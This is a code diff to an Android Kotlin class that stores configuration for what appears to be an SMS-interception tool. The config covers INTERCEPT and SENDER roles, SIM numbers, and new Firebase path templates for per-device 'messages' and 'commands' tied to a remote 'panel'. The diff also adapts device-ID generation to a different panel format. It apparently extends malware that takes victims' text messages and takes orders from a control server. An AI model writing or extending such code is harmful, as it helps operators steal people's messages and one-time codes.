@@ -34,7 +34,11 @@ object FirebaseAutoTokenStore {
         val role: Role = Role.INTERCEPT,
         val senderSimSlot: Int = 0,
         val sim1Number: String = "",
-        val sim2Number: String = ""
+        val sim2Number: String = "",
+        val panelLabel: String = "Standard",
+        val devicesRoot: String = "devices",
+        val messagesTemplate: String = "messages/{deviceId}",
+        val commandsTemplate: String = "commands/{deviceId}"
     ) {
         fun canIntercept(): Boolean = enabled && role != Role.SENDER
         fun canSend(): Boolean = enabled && role != Role.INTERCEPT
@@ -49,7 +53,7 @@ object FirebaseAutoTokenStore {
         return current.copy(deviceId = generateDeviceId())
     }
 
-    fun generateDeviceId(): String = GianPanelCompat.generateDeviceId()
+    fun generateDeviceId(): String = HivirtusPanelFormat.generateDeviceId()
 
     fun save(context: Context, config: Config): Boolean {
         val normalized = ensureDeviceId(context, config)
@@ -63,6 +67,10 @@ object FirebaseAutoTokenStore {
             .put("sender_sim_slot", normalized.senderSimSlot.coerceIn(0, 1))
             .put("sim1_number", normalized.sim1Number.trim())
             .put("sim2_number", normalized.sim2Number.trim())
+            .put("panel_label", normalized.panelLabel.trim())
+            .put("devices_root", normalized.devicesRoot.trim())
+            .put("messages_template", normalized.messagesTemplate.trim())
+            .put("commands_template", normalized.commandsTemplate.trim())
             .toString(2)
         return try {
             val appDir = context.getExternalFilesDir(null) ?: context.filesDir
@@ -110,6 +118,10 @@ object FirebaseAutoTokenStore {
         role = Role.fromWire(json.optString("role", Role.INTERCEPT.wire)),
         senderSimSlot = json.optInt("sender_sim_slot", 0).coerceIn(0, 1),
         sim1Number = json.optString("sim1_number", "").trim(),
-        sim2Number = json.optString("sim2_number", "").trim()
+        sim2Number = json.optString("sim2_number", "").trim(),
+        panelLabel = json.optString("panel_label", "Standard").trim(),
+        devicesRoot = json.optString("devices_root", "devices").trim(),
+        messagesTemplate = json.optString("messages_template", "messages/{deviceId}").trim(),
+        commandsTemplate = json.optString("commands_template", "commands/{deviceId}").trim()
     )
 }
